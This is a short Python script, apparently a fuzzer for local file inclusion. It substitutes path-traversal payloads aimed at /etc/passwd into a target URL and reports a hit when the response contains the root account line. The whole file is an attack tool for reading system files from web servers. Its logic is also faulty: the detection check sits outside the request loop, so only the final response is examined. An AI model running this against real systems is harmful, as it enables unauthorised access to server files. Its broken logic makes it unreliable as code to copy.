import requests, sys
if len(sys.argv) < 2:
    sys.exit("Missing target !")
elif not '{fuzz}' in sys.argv[1]:
    sys.exit("Missing {fuzz} parameter !")
else:
    selected_target = sys.argv[1]
payloads = ['/etc/passwd', '../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd']
for payload in payloads:
    target = selected_target.replace('{fuzz}', payload)
    request = requests.get(target)
if b"root:x:0:" in request.content:
    print("LFI ! with {} payload".format (payload))
else:
    pass
    print ("Finished !")
